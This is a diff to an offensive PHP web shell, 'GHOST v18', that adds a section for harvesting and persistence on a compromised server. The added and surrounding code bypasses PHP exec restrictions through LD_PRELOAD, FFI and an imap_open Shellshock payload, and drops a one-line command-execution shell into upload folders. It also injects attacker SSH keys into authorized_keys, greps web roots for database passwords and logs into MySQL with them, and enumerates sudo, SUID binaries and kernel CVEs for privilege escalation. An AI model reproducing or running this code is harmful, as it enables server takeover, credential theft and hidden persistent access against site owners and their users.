@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0, 1, 2, 3: bootstrap, UI, defense evasion, scanner.
+// GHOST v18 - section 0, 1, 2, 3, 4: bootstrap, UI, evasion, scanner, harvest.
 
-define('GH_VER',      '18.0.0-s3-fix');
+define('GH_VER',      '18.0.0-s4');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
@@ -167,52 +167,29 @@ function gh_exec($cmd, $timeout = 10) {
 
 function gh_exec_adv($cmd, $timeout = 10) {
     if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
-    
-    // TIER 1: Basic exec (paling stabil)
     $r = gh_exec($cmd, $timeout); 
-    if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== null) {
-        return $r;
-    }
+    if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== null) return $r;
 
-    // TIER 2: LD_PRELOAD (Cek fungsi dasar dulu sebelum eksekusi)
     if (gh_can('putenv') && gh_can('mail') && gh_can('file_put_contents') && gh_can_exec()) {
-        $tmp_dir = gh_tmpdir(); 
-        if(!$tmp_dir) $tmp_dir = '/tmp';
-        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so'; 
-        $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
+        $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
+        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so'; $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
         $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n  unsetenv(\"LD_PRELOAD\");\n  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
-        
         if (@file_put_contents($tmp_dir . '/gh_c.c', $c_code) !== false) {
             gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
             if (@is_file($so_file)) {
-                @file_put_contents($cmd_file, $cmd); 
-                @putenv("LD_PRELOAD=" . $so_file); 
-                @mail('a@b.c', 'x', 'x'); 
-                @putenv("LD_PRELOAD=");
+                @file_put_contents($cmd_file, $cmd); @putenv("LD_PRELOAD=" . $so_file); @mail('a@b.c', 'x', 'x'); @putenv("LD_PRELOAD=");
                 @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
-                return array('out' => '(Executed via LD_PRELOAD - output might be hidden)', 'tier' => 'ld_preload', 'err' => null);
+                return array('out' => '(Executed via LD_PRELOAD)', 'tier' => 'ld_preload', 'err' => null);
             }
         }
     }
-
-    // TIER 3: FFI
     if (gh_can('ffi') && class_exists('FFI')) {
-        try { 
-            $ffi = FFI::cdef("int system(const char *command);"); 
-            @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); 
-            return array('out' => $out, 'tier' => 'ffi', 'err' => null); 
-        } catch (Throwable $e) {
-            // Ignore FFI error
-        }
+        try { $ffi = FFI::cdef("int system(const char *command);"); @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); return array('out' => $out, 'tier' => 'ffi', 'err' => null); } catch (Throwable $e) {}
     }
-
-    // TIER 4: imap_open
     if (gh_can('imap_open')) {
-        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd); 
-        $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
+        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
         if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
     }
-
     return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
 }
 
@@ -320,7 +297,166 @@ function gh_vuln_scan() {
     return $vulns;
 }
 
-// ==== ROUTER (section 0 + 1 + 2 + 3) ========================================
+// ==== SECTION 4: SSH, DB HARVEST, PRIVESC ===================================
+function gh_ssh_scan() {
+    $res = array('files' => array(), 'keys' => array());
+    $home = gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['dir'] : @getenv('HOME');
+    $targets = array(
+        $home . '/.ssh/authorized_keys',
+        $home . '/.ssh/authorized_keys2',
+        '/root/.ssh/authorized_keys',
+        '/etc/ssh/authorized_keys'
+    );
+    
+    // Deep scan /home
+    $find = gh_exec_adv("find /home -name 'authorized_keys*' -type f 2>/dev/null");
+    if (isset($find['out']) && trim($find['out'])) {
+        foreach (explode("\n", trim($find['out'])) as $f) { if(trim($f)) $targets[] = trim($f); }
+    }
+
+    foreach (array_unique($targets) as $t) {
+        if (!@is_file($t)) continue;
+        $perm = @substr(sprintf('%o', @fileperms($t)), -4);
+        $lines = @file($t, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $res['files'][] = array('path' => $t, 'perm' => $perm, 'count' => is_array($lines) ? count($lines) : 0);
+        if (is_array($lines)) {
+            foreach ($lines as $l) {
+                $p = explode(' ', trim($l));
+                if (count($p) >= 2) {
+                    $res['keys'][] = array('file' => $t, 'type' => $p[0], 'comment' => isset($p[2]) ? $p[2] : 'none', 'raw' => trim($l));
+                }
+            }
+        }
+    }
+    return $res;
+}
+
+function gh_ssh_action($action, $key = '') {
+    $home = gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['dir'] : @getenv('HOME');
+    $auth = $home . '/.ssh/authorized_keys';
+    
+    if ($action === 'clean') {
+        if (!@is_file($auth)) return array('msg' => 'No authorized_keys found.');
+        @copy($auth, $auth . '.bak_' . time());
+        $lines = @file($auth, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $new = array();
+        foreach ($lines as $l) { if (strpos($l, trim($key)) === false) $new[] = $l; }
+        @file_put_contents($auth, implode("\n", $new) . "\n");
+        return array('msg' => 'Cleaned. Removed keys matching: ' . htmlspecialchars(substr($key,0,20)) . '...');
+    }
+    
+    if ($action === 'inject') {
+        if (strpos($key, 'ssh-') !== 0 && strpos($key, 'ecdsa-') !== 0 && strpos($key, 'sk-') !== 0) {
+            return array('msg' => 'Invalid key format. Must start with ssh-rsa, ssh-ed25519, etc.');
+        }
+        if (!@is_dir(dirname($auth))) @mkdir(dirname($auth), 0700, true);
+        $cur = @is_file($auth) ? @file_get_contents($auth) : '';
+        if (strpos($cur, trim($key)) !== false) return array('msg' => 'Key already exists.');
+        @file_put_contents($auth, trim($cur) . "\n" . trim($key) . "\n", LOCK_EX);
+        @chmod($auth, 0600);
+        return array('msg' => 'Key injected successfully to ' . $auth);
+    }
+    
+    if ($action === 'fixperm') {
+        @chmod($auth, 0600);
+        @chmod(dirname($auth), 0700);
+        return array('msg' => 'Permissions fixed (600 key, 700 dir).');
+    }
+    return array('msg' => 'Unknown action.');
+}
+
+function gh_db_harvest() {
+    $logs = array(); $creds = array();
+    $paths = array(
+        isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd(),
+        '/home', '/var/www'
+    );
+    
+    // 1. Deep config search
+    $search_cmd = "grep -rEli '(DB_PASSWORD|DB_USER|mysql_password|database_password|DB_PASS|MYSQL_PASS)' /home /var/www " . @escapeshellarg(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '') . " 2>/dev/null | head -n 50";
+    $grep = gh_exec_adv($search_cmd);
+    $files = array();
+    if (isset($grep['out']) && trim($grep['out'])) {
+        foreach (explode("\n", trim($grep['out'])) as $f) { if(trim($f)) $files[] = trim($f); }
+    }
+    
+    foreach ($files as $f) {
+        $c = gh_read($f, 1048576);
+        if (!is_string($c)) continue;
+        
+        // Regex multi-format
+        $user = ''; $pass = ''; $host = 'localhost';
+        if (preg_match('/(?:DB_USER|username|user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $user = $m[1];
+        if (preg_match('/(?:DB_PASSWORD|password|pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $pass = $m[1];
+        if (preg_match('/(?:DB_HOST|host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $host = $m[1];
+        
+        if ($user && $pass) {
+            $creds[] = array('file' => $f, 'user' => $user, 'pass' => $pass, 'host' => $host);
+        }
+    }
+    
+    // 2. Brute force connect
+    $connections = array();
+    foreach ($creds as $cr) {
+        $log = "[*] Trying {$cr['user']}:{$cr['pass']} @ {$cr['host']} (from {$cr['file']})";
+        if (gh_can('mysqli_connect')) {
+            try {
+                $conn = @mysqli_connect($cr['host'], $cr['user'], $cr['pass'], '', 3306, null, array('connect_timeout'=>2));
+                if ($conn) {
+                    $log .= " -> CONNECTED!";
+                    $dbs = array();
+                    $q = @mysqli_query($conn, "SHOW DATABASES");
+                    if ($q) { while($r = @mysqli_fetch_array($q)) { $dbs[] = $r[0]; } }
+                    $connections[] = array('cred' => $cr, 'dbs' => $dbs);
+                } else {
+                    $log .= " -> FAILED (" . @mysqli_connect_error() . ")";
+                }
+            } catch (Throwable $e) { $log .= " -> EXCEPTION (" . $e->getMessage() . ")"; }
+        } else {
+            // Fallback CLI
+            $cmd = "mysql -u " . @escapeshellarg($cr['user']) . " -p" . @escapeshellarg($cr['pass']) . " -h " . @escapeshellarg($cr['host']) . " -e 'SHOW DATABASES' 2>&1";
+            $r = gh_exec_adv($cmd);
+            if (isset($r['out']) && strpos($r['out'], 'Database') !== false) {
+                $log .= " -> CONNECTED via CLI!";
+                $connections[] = array('cred' => $cr, 'dbs' => explode("\n", $r['out']));
+            } else {
+                $log .= " -> CLI FAILED";
+            }
+        }
+        $logs[] = $log;
+    }
+    return array('logs' => $logs, 'creds' => $creds, 'connections' => $connections);
+}
+
+function gh_privesc_scan() {
+    $res = array('os' => @php_uname('a'), 'kernel' => @php_uname('r'), 'sudo' => array(), 'suid' => array(), 'cron' => array());
+    
+    // Kernel CVE
+    $kernel = @php_uname('r');
+    if (preg_match('/^([0-9]+\.[0-9]+\.[0-9]+)/', $kernel, $m)) {
+        $kver = $m[1];
+        if (version_compare($kver, '5.16.11', '<=')) $res['cve'][] = "CVE-2022-0847 (DirtyPipe) - Kernel <= 5.16.11";
+        if (version_compare($kver, '5.11', '<=')) $res['cve'][] = "CVE-2021-3493 (OverlayFS) - Kernel <= 5.11";
+    }
+    
+    // Sudo
+    $s = gh_exec_adv("sudo -n -l 2>&1");
+    if (isset($s['out']) && strpos($s['out'], 'not allowed') === false) $res['sudo'][] = $s['out'];
+    
+    // SUID Deep
+    $suid = gh_exec_adv("find / -perm -4000 -type f 2>/dev/null | head -n 50");
+    if (isset($suid['out']) && trim($suid['out'])) {
+        foreach (explode("\n", trim($suid['out'])) as $f) { if(trim($f)) $res['suid'][] = trim($f); }
+    }
+    
+    // Cron
+    $cron = gh_exec_adv("cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null; crontab -l 2>/dev/null");
+    if (isset($cron['out']) && trim($cron['out'])) $res['cron'][] = $cron['out'];
+    
+    return $res;
+}
+
+// ==== ROUTER (section 0 + 1 + 2 + 3 + 4) ====================================
 function gh_router() {
     $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
     if ($act === '') { @header('Location: ?act=ui'); exit; }
@@ -340,6 +476,10 @@ function gh_router() {
                 elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
                 else gh_json(array('msg'=>'Exploit not implemented.'));
                 break;
+            case 'ssh_scan': gh_json(gh_ssh_scan()); break;
+            case 'ssh_action': gh_json(gh_ssh_action($_POST['action'] ?? '', $_POST['key'] ?? '')); break;
+            case 'db_harvest': gh_json(gh_db_harvest()); break;
+            case 'privesc': gh_json(gh_privesc_scan()); break;
             default: gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
         }
     } catch (Throwable $e) {
@@ -348,7 +488,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (section 1 + 2 + 3) ================================================
+// ==== UI (section 1 + 2 + 3 + 4) ============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -389,7 +529,7 @@ function gh_ui() {
 </head>
 <body>
 <div class="box">
-    <h2>GHOST v18 / Section 3</h2>
+    <h2>GHOST v18 / Section 4</h2>
     <div class="row">
         <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
         <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
@@ -418,21 +558,49 @@ function gh_ui() {
     <pre id="f-out" style="margin-top:8px;">Ready.</pre>
 </div>
 
-<div class="box">
-    <h2>Deep File Scanner (Heuristic)</h2>
-    <div class="row">
-        <button onclick="startScan()">Start Scan</button>
-        <span id="scan-status" class="dim">Idle.</span>
+<div class="grid">
+    <div class="box">
+        <h2>SSH Manager</h2>
+        <div class="row">
+            <button onclick="sshScan()">Scan SSH</button>
+        </div>
+        <div id="ssh-res"></div>
+        <div class="row" style="margin-top:8px;">
+            <input type="text" id="ssh-key" placeholder="ssh-rsa AAA..." style="flex:1;">
+            <button onclick="sshAct('inject')">Inject</button>
+            <button onclick="sshAct('clean')" style="border-color:#f00;color:#f00;">Clean</button>
+        </div>
+        <pre id="ssh-log" style="margin-top:8px;max-height:100px;">Idle.</pre>
     </div>
-    <div id="scan-results"></div>
+
+    <div class="box">
+        <h2>Database Harvester</h2>
+        <div class="row">
+            <button onclick="dbHarvest()">Start Harvest</button>
+        </div>
+        <pre id="db-res" style="margin-top:8px;max-height:200px;">Idle.</pre>
+    </div>
 </div>
 
-<div class="box">
-    <h2>Vulnerability Explorer</h2>
-    <div class="row">
-        <button onclick="startVulnScan()">Scan Vulnerabilities</button>
+<div class="grid">
+    <div class="box">
+        <h2>Deep File Scanner</h2>
+        <div class="row">
+            <button onclick="startScan()">Start Scan</button>
+            <span id="scan-status" class="dim">Idle.</span>
+        </div>
+        <div id="scan-results"></div>
     </div>
-    <div id="vuln-results"></div>
+
+    <div class="box">
+        <h2>Privilege Escalation & Vuln</h2>
+        <div class="row">
+            <button onclick="privescScan()">Scan Privesc</button>
+            <button onclick="startVulnScan()">Scan Vuln</button>
+        </div>
+        <div id="privesc-res"></div>
+        <div id="vuln-results"></div>
+    </div>
 </div>
 
 <script>
@@ -445,6 +613,7 @@ async function api(act, data={}) {
     try { return JSON.parse(text); } catch(e) { return {err:'Invalid JSON: '+text.substring(0,100)}; }
 }
 
+// Terminal & File Mgr
 async function execCmd() {
     const cmd = document.getElementById('cmd').value.trim(); if(!cmd) return;
     document.getElementById('cmd').value = '';
@@ -458,14 +627,12 @@ async function execCmd() {
     else outLine.innerHTML = `<span class="dim">[${esc(resp.tier)}]</span><span class="term-out">${esc(resp.out||'(no output)')}</span>`;
     t.appendChild(outLine); t.scrollTop = t.scrollHeight;
 }
-
 async function readFile() {
     const p = document.getElementById('f-path').value.trim(); const o = document.getElementById('f-out');
     if(!p) return o.innerText = 'Path?'; o.innerText = 'Reading...';
     const resp = await api('read', {path:p});
     o.innerText = resp.err ? 'Error: '+resp.err : (resp.content || '(empty)');
 }
-
 async function writeFile() {
     const p = document.getElementById('f-path').value.trim(); if(!p) return alert('Path?');
     const data = prompt('Isi konten:'); if(data === null) return;
@@ -474,16 +641,57 @@ async function writeFile() {
     o.innerText = resp.ok ? 'Success.' : 'Error.';
 }
 
+// SSH
+async function sshScan() {
+    const res = document.getElementById('ssh-res'); res.innerHTML = 'Scanning...';
+    const d = await api('ssh_scan');
+    if (d.err) return res.innerHTML = '<span class="err">'+d.err+'</span>';
+    let h = `<table><tr><th>File</th><th>Perm</th><th>Keys</th></tr>`;
+    d.files.forEach(f => h += `<tr><td>${esc(f.path)}</td><td>${esc(f.perm)}</td><td>${f.count}</td></tr>`);
+    h += `</table>`;
+    if (d.keys.length) {
+        h += `<table><tr><th>Type</th><th>Comment</th></tr>`;
+        d.keys.forEach(k => h += `<tr><td>${esc(k.type)}</td><td>${esc(k.comment)}</td></tr>`);
+        h += `</table>`;
+    }
+    res.innerHTML = h;
+}
+async function sshAct(action) {
+    const k = document.getElementById('ssh-key').value.trim();
+    if (!k) return alert('Isi key dulu!');
+    if (!confirm('Yakin ingin '+action+' SSH key ini?')) return;
+    const d = await api('ssh_action', {action: action, key: k});
+    document.getElementById('ssh-log').innerText = d.msg || d.err;
+    sshScan();
+}
+
+// DB Harvest
+async function dbHarvest() {
+    const res = document.getElementById('db-res'); res.innerText = 'Harvesting (mungkin butuh waktu)...';
+    const d = await api('db_harvest');
+    if (d.err) return res.innerText = 'Error: ' + d.err;
+    let out = '';
+    d.logs.forEach(l => out += l + '\n');
+    if (d.connections.length) {
+        out += '\n=== DATABASES FOUND ===\n';
+        d.connections.forEach(c => {
+            out += `\n[${c.cred.user}@${c.cred.host}]\n` + c.dbs.join('\n') + '\n';
+        });
+    }
+    res.innerText = out || 'No credentials found.';
+}
+
+// Scanner & Privesc
 async function startScan() {
     let offset = 0; let mal = [];
     const resDiv = document.getElementById('scan-results'); resDiv.innerHTML = '';
     const statDiv = document.getElementById('scan-status'); statDiv.innerText = 'Scanning...';
     while (true) {
-        statDiv.innerText = `Analyzing batch offset ${offset}...`;
+        statDiv.innerText = `Analyzing offset ${offset}...`;
         const d = await api('scan', {offset: offset});
         if (d.err) { statDiv.innerText = 'Error: ' + d.err; break; }
         d.files.forEach(f => mal.push(f));
-        if (d.done) { statDiv.innerText = `Done! ${mal.length} files flagged from ${d.total}.`; renderScan(mal); break; }
+        if (d.done) { statDiv.innerText = `Done! ${mal.length} flagged.`; renderScan(mal); break; }
         offset += 50;
     }
 }
@@ -493,22 +701,31 @@ function renderScan(mal) {
     mal.forEach(x => h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td></tr>`);
     h += `</table>`; document.getElementById('scan-results').innerHTML = h;
 }
-
+async function privescScan() {
+    const res = document.getElementById('privesc-res'); res.innerHTML = 'Scanning...';
+    const d = await api('privesc');
+    if (d.err) return res.innerHTML = '<span class="err">'+d.err+'</span>';
+    let h = `<pre>Kernel: ${esc(d.kernel)}\n`;
+    if (d.cve && d.cve.length) h += `CVE: \n  - ${d.cve.join('\n  - ')}\n`;
+    if (d.sudo && d.sudo.length) h += `Sudo: \n  ${esc(d.sudo.join('\n  '))}\n`;
+    h += `SUID: \n  ${d.suid.map(esc).join('\n  ')}\n`;
+    h += `</pre>`;
+    res.innerHTML = h;
+}
 async function startVulnScan() {
     const resDiv = document.getElementById('vuln-results'); resDiv.innerHTML = 'Scanning...';
     const d = await api('vuln_scan');
     if (d.err) { resDiv.innerHTML = '<span class="err">Error: '+d.err+'</span>'; return; }
-    if (!d.length) { resDiv.innerHTML = '<p class="dim">No vulnerabilities found.</p>'; return; }
-    let h = `<table><tr><th>Type</th><th>Path</th><th>Desc</th><th>Aksi</th></tr>`;
+    if (!d.length) { resDiv.innerHTML = '<p class="dim">Clean.</p>'; return; }
+    let h = `<table><tr><th>Type</th><th>Path</th><th>Aksi</th></tr>`;
     d.forEach(v => {
-        h += `<tr><td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td>
+        h += `<tr><td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td>
               <td><button onclick="exploit('${esc(v.type)}', '${encodeURIComponent(v.path)}')" style="border-color:#f00;color:#f00;">Exploit</button></td></tr>`;
     });
     h += `</table>`; resDiv.innerHTML = h;
 }
-
 async function exploit(t, encP) {
-    if(!confirm('Jalankan exploit untuk celah ini?')) return;
+    if(!confirm('Jalankan exploit?')) return;
     const p = decodeURIComponent(encP);
     const d = await api('exploit', {type: t, path: p});
     alert(d.msg || d.err);
